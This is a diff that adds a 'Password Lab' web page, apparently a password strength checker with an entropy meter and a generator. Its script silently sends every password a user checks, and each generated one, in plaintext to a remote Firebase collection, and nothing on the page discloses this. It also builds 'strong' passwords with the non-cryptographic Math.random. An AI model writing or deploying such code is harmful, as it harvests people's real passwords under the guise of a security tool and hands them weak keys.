@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Password Lab</title>
+
+<style>
+:root {
+    --neon-green: #00ff99;
+    --neon-red: #ff4d4d;
+    --neon-orange: #ffa500;
+    --glass-bg: rgba(255,255,255,0.05);
+}
+
+body {
+    background: radial-gradient(circle at center, #0f2027, #203a43, #2c5364);
+    font-family: 'Segoe UI', sans-serif;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    text-align: center;
+}
+
+.lab-card {
+    background: var(--glass-bg);
+    backdrop-filter: blur(15px);
+    border: 1px solid rgba(255,255,255,0.1);
+    padding: 30px;
+    border-radius: 20px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    width: 350px;
+}
+
+.input-container {
+    position: relative;
+    margin-bottom: 15px;
+}
+
+.input-container input {
+    width: 100%;
+    padding: 12px;
+    padding-right: 45px;
+    font-size: 16px;
+    border-radius: 8px;
+    border: 1px solid #444;
+    background: rgba(0,0,0,0.3);
+    color: var(--neon-green);
+    outline: none;
+    box-sizing: border-box;
+}
+
+.eye {
+    position: absolute;
+    right: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    font-size: 20px;
+}
+
+.cyber-btn {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid var(--neon-green);
+    border-radius: 8px;
+    background: transparent;
+    color: var(--neon-green);
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+    margin-bottom: 15px;
+}
+
+.cyber-btn:hover {
+    background: var(--neon-green);
+    color: black;
+    box-shadow: 0 0 15px var(--neon-green);
+}
+
+.stats-grid {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 15px;
+}
+
+.stat-box {
+    background: rgba(0,0,0,0.2);
+    padding: 8px;
+    border-radius: 6px;
+    width: 46%;
+    font-size: 12px;
+}
+
+#strengthBar {
+    width: 100%;
+    height: 10px;
+    background: #222;
+    border-radius: 5px;
+    overflow: hidden;
+    margin-bottom: 15px;
+}
+
+#bar {
+    height: 100%;
+    width: 0%;
+    transition: 0.5s ease;
+}
+
+#message {
+    margin-top: 10px;
+    font-weight: bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="lab-card">
+<h2>PASSWORD: LAB</h2>
+
+<div class="input-container">
+    <input type="password" id="password" placeholder="Enter Key...">
+    <span class="eye" id="eyeBtn">🐵</span>
+</div>
+
+<!-- CHECK BUTTON -->
+<button id="checkBtn" class="cyber-btn"
+style="opacity:0; pointer-events:none; transition:0.3s;">
+CHECK PASSWORD
+</button>
+
+<div class="stats-grid">
+    <div class="stat-box">
+        <div>ENTROPY</div>
+        <div id="entropy" style="color: var(--neon-green)">0 bits</div>
+    </div>
+    <div class="stat-box">
+        <div>CRACK TIME</div>
+        <div id="crackTime" style="color: var(--neon-green)">Instantly</div>
+    </div>
+</div>
+
+<div id="strengthBar">
+    <div id="bar"></div>
+</div>
+
+<div id="message">NO DATA</div>
+
+<button class="cyber-btn" id="generateBtn">
+GENERATE STRONG KEY
+</button>
+</div>
+
+<script type="module">
+
+// 🔥 Firebase Imports (THIS WAS MISSING)
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { 
+  getFirestore, 
+  collection, 
+  addDoc, 
+  serverTimestamp 
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "YOUR_KEY",
+  authDomain: "check-lab-e1b74.firebaseapp.com",
+  projectId: "check-lab-e1b74",
+  storageBucket: "check-lab-e1b74.firebasestorage.app",
+  messagingSenderId: "496257845990",
+  appId: "1:496257845990:web:092e2a8c760b50dd03c927"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const passwordInput = document.getElementById("password");
+const checkBtn = document.getElementById("checkBtn");
+const generateBtn = document.getElementById("generateBtn");
+const eyeBtn = document.getElementById("eyeBtn");
+
+
+// SHOW / HIDE CHECK BUTTON
+passwordInput.addEventListener("input", () => {
+    if (passwordInput.value.trim().length > 0) {
+        checkBtn.style.opacity = "1";
+        checkBtn.style.pointerEvents = "auto";
+    } else {
+        checkBtn.style.opacity = "0";
+        checkBtn.style.pointerEvents = "none";
+    }
+});
+
+checkBtn.addEventListener("click", checkStrength);
+generateBtn.addEventListener("click", generatePassword);
+eyeBtn.addEventListener("click", togglePassword);
+
+
+// SAVE FUNCTION (USED FOR BOTH TYPED & GENERATED)
+async function saveToFirebase(passwordValue, entropyValue) {
+    try {
+        await addDoc(collection(db, "entropy_logs"), {
+            password: passwordValue,
+            entropy: entropyValue,
+            length: passwordValue.length,
+            createdAt: serverTimestamp()
+        });
+    } catch (e) {
+        console.log("Save failed");
+    }
+}
+
+
+async function checkStrength() {
+    let password = passwordInput.value;
+    let bar = document.getElementById("bar");
+    let message = document.getElementById("message");
+
+    let pool = 0;
+    if (/[a-z]/.test(password)) pool += 26;
+    if (/[A-Z]/.test(password)) pool += 26;
+    if (/[0-9]/.test(password)) pool += 10;
+    if (/[^A-Za-z0-9]/.test(password)) pool += 32;
+
+    let entropy = password.length * Math.log2(pool || 1);
+    let entropyFixed = entropy.toFixed(1);
+
+    document.getElementById("entropy").innerText = entropyFixed + " bits";
+
+    // SAVE TYPED PASSWORD
+    await saveToFirebase(password, entropyFixed);
+
+    let percent = Math.min((entropy / 80) * 100, 100);
+    bar.style.width = percent + "%";
+
+    if (entropy < 30) {
+        bar.style.background = "var(--neon-red)";
+        message.innerHTML = "<span style='color:var(--neon-red)'>VULNERABLE</span>";
+    } else if (entropy < 60) {
+        bar.style.background = "var(--neon-orange)";
+        message.innerHTML = "<span style='color:var(--neon-orange)'>MODERATE</span>";
+    } else {
+        bar.style.background = "var(--neon-green)";
+        message.innerHTML = "<span style='color:var(--neon-green)'>SECURE</span>";
+    }
+}
+
+
+function generatePassword() {
+    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+    let finalPassword = "";
+
+    for (let i = 0; i < 16; i++) {
+        finalPassword += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+
+    animatePassword(finalPassword);
+}
+
+
+function animatePassword(text) {
+    passwordInput.type = "text";
+    passwordInput.value = text;
+
+    let glitchChars = "!@#$%^&*()_+-=[]{}|;:,.<>?";
+    let start = Date.now();
+
+    let glitchInterval = setInterval(() => {
+
+        if (Date.now() - start < 1000) {
+
+            let glitched = "";
+
+            for (let i = 0; i < text.length; i++) {
+                if (Math.random() < 0.4) {
+                    glitched += glitchChars.charAt(
+                        Math.floor(Math.random() * glitchChars.length)
+                    );
+                } else {
+                    glitched += text[i];
+                }
+            }
+
+            passwordInput.value = glitched;
+
+        } else {
+            clearInterval(glitchInterval);
+
+            passwordInput.value = text;
+
+            // SHOW CHECK BUTTON
+            checkBtn.style.opacity = "1";
+            checkBtn.style.pointerEvents = "auto";
+
+            // AUTO CHECK (this will also save)
+            checkStrength();
+        }
+
+    }, 70);
+}
+
+
+function togglePassword() {
+    passwordInput.type =
+        passwordInput.type === "password" ? "text" : "password";
+}
+
+</script>
+
+</body>
+</html>
